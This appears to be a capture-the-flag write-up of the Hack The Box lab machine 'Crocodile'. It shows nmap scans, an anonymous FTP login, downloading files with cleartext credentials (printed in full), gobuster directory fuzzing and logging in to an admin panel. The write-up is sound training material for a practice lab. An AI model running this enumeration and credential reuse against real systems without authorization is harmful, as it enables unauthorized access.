---
layout: single
title: 'Crocodile'
excerpt: 'Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the previously acquired credentials can be used to gain access to the admin panel.'
date: 2026-06-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-crocodile/crocodile_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.svg
categories:
  - HTB Starting Point
tags:
  - Tier-1-Fundamental-Exploitation
os: Linux
difficulty: Very Easy
release: 2021-10-06
ip: 10.129.139.109
---

{% include info-card.html %}

## Task 1

![Task 1](/assets/images/htb-writeup-crocodile/Task 1.png)

## Task 2

![Task 2](/assets/images/htb-writeup-crocodile/Task 2.png)

<pre class="language-"><code class="language-">
❯ nmap -sCV -p21 10.129.139.109 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-29 01:52 -05
Nmap scan report for 10.129.139.109
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     <span style="color: #bb66ff;">vsftpd 3.0.3</span>
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.165
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.16 seconds
</code></pre>

## Task 3

![Task 3](/assets/images/htb-writeup-crocodile/Task 3.png)

## Task 4

![Task 4](/assets/images/htb-writeup-crocodile/Task 4.png)

<pre class="language-"><code class="language-">
❯ ftp 10.129.139.109
Connected to 10.129.139.109.
220 (vsFTPd 3.0.3)
Name (10.129.139.109:root): anonymous 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
</code></pre>

## Task 5

![Task 5](/assets/images/htb-writeup-crocodile/Task 5.png)

<pre class="language-"><code class="language-">
ftp> ls
229 Entering Extended Passive Mode (|||45460|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||49975|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |*************************************************************************************************************************************************************************************************************|    33        9.93 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.17 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||41864|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |*************************************************************************************************************************************************************************************************************|    62        0.98 MiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.46 KiB/s)
ftp> 
</code></pre>

## Task 6

![Task 6](/assets/images/htb-writeup-crocodile/Task 6.png)

#### <span style="color: #bb66ff;">Users</span>

<pre class="language-"><code class="language-">
❯ cat allowed.userlist
─────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: allowed.userlist
─────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ aron
   2 │ pwnmeow
   3 │ egotisticalsw
   4 │ admin
─────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre>

#### <span style="color: #bb66ff;">Passwords</span>

<pre class="language-"><code class="language-">
❯ cat allowed.userlist.passwd
─────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: allowed.userlist.passwd
─────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ root
   2 │ Supersecretpassword1
   3 │ @BaASD&9032123sADS
   4 │ rKXM59ESxesUFHAd
─────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre>

## Task 7

![Task 7](/assets/images/htb-writeup-crocodile/Task 7.png)

<pre class="language-"><code class="language-">
❯ nmap -sCV -p80 10.129.139.109 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-29 02:03 -05
Nmap scan report for 10.129.139.109
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    <span style="color: #bb66ff;">Apache httpd 2.4.41</span> ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
</code></pre>

## Task 8

![Task 8](/assets/images/htb-writeup-crocodile/Task 8.png)

## Task 9

![Task 9](/assets/images/htb-writeup-crocodile/Task 9.png)

<pre class="language-"><code class="language-">
❯ gobuster dir -u http://10.129.139.109/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.139.109/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login.php            (Status: 200) [Size: 1577]
assets               (Status: 301) [Size: 317] [--> http://10.129.139.109/assets/]
css                  (Status: 301) [Size: 314] [--> http://10.129.139.109/css/]
js                   (Status: 301) [Size: 313] [--> http://10.129.139.109/js/]
logout.php           (Status: 302) [Size: 0] [--> login.php]
config.php           (Status: 200) [Size: 0]
Progress: 3904 / 441116 (0.89%)^C
</code></pre>

## Submit Flag

I found the credentials `admin:rKXM59ESxesUFHAd` on the FTP server and used them to log in to the login panel from the previous task.

![alt](/assets/images/htb-writeup-crocodile/Home%20WebPage.png)

![alt](/assets/images/htb-writeup-crocodile/Login%20php.png)

![alt](/assets/images/htb-writeup-crocodile/Flag.png)

![You have solved Crocodile!](/assets/images/htb-writeup-crocodile/You%20have%20solved%20Crocodile!.png)
